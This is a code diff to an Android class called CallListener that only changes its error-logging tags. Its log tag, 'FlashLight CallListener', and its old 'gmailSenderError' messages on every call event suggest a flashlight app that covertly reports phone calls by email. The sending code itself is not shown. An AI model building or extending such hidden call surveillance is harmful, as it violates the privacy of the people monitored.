@@ -18,6 +18,8 @@ public class CallListener extends PhoneCallReceiver {
   private static Configure configure;
   private static String gmailEmailString;
 
+  private static final String TAG = "FlashLight CallListener";
+
   public CallListener() { 
     configure = new Configure();
     if(!configure.getDatabaseInfo().equals("null")) { 
@@ -40,7 +42,7 @@ public class CallListener extends PhoneCallReceiver {
         }
         catch(Exception e) {
           e.printStackTrace();
-          Log.e("gmailSenderError onIncomingCallReceived()", " " + e.toString());
+          Log.e(TAG, "gmailSenderError onIncomingCallReceived() " + e.toString());
         }
       }
     }).start();
@@ -58,7 +60,7 @@ public class CallListener extends PhoneCallReceiver {
         }
         catch(Exception e) {
           e.printStackTrace();
-          Log.e("gmailSenderError onIncomingCallAnswered()", " " + e.toString());
+          Log.e(TAG, "onIncomingCallAnswered() Exception e " + e.toString());
         }
       }
     }).start();
@@ -76,7 +78,7 @@ public class CallListener extends PhoneCallReceiver {
         }
         catch(Exception e) {
           e.printStackTrace();
-          Log.e("gmailSenderError onIncomingCallEnded()", " " + e.toString());
+          Log.e(TAG, "onIncomingCallEnded() Exception e " + e.toString());
         }
       }
     }).start();
@@ -94,7 +96,7 @@ public class CallListener extends PhoneCallReceiver {
         }
         catch(Exception e) {
           e.printStackTrace();
-          Log.e("gmailSenderError onOutgoingCallStarted()", " " + e.toString());
+          Log.e(TAG, "onOutgoingCallStarted() Exception e " + e.toString());
         }
       }
     }).start();
@@ -112,7 +114,7 @@ public class CallListener extends PhoneCallReceiver {
         }
         catch(Exception e) {
           e.printStackTrace();
-          Log.e("gmailSenderError onOutgoingCallEnded()", " " + e.toString());
+          Log.e(TAG, "onOutgoingCallEnded() Exception e " + e.toString());
         }
       }
     }).start();
@@ -130,7 +132,7 @@ public class CallListener extends PhoneCallReceiver {
         }
         catch(Exception e) {
           e.printStackTrace();
-          Log.e("gmailSenderError onMissedCall()", " " + e.toString());
+          Log.e(TAG, "onMissedCall() Exception e " + e.toString());
         }
       }
     }).start();
